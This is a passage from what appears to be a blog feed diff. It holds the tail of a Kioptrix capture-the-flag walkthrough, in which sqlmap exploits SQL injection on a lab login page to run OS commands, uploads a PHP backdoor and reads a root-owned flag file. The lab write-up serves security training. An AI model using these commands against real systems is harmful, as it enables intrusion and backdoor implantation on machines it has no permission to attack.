+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &lt;a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php&lt;/a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;id&rsquo; &ndash;batch | grep uid
+</span><span class='line'>command standard output:    &lsquo;uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~# sqlmap -u &lt;a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php&lt;/a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;cat /root/congrats.txt&rsquo; &ndash;batch
+</span><span class='line'>&hellip;
+</span><span class='line'>[00:13:06] [INFO] the backdoor has been successfully uploaded on &lsquo;/var/www/&rsquo; - &lt;a href="http://192.168.80.154:80/tmpbborl.php">http://192.168.80.154:80/tmpbborl.php&lt;/a>
+</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] Y&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>command standard output:&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Congratulations!
+</span><span class='line'>You&rsquo;ve got root.
+</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kioptrix: Level 3]]></title>
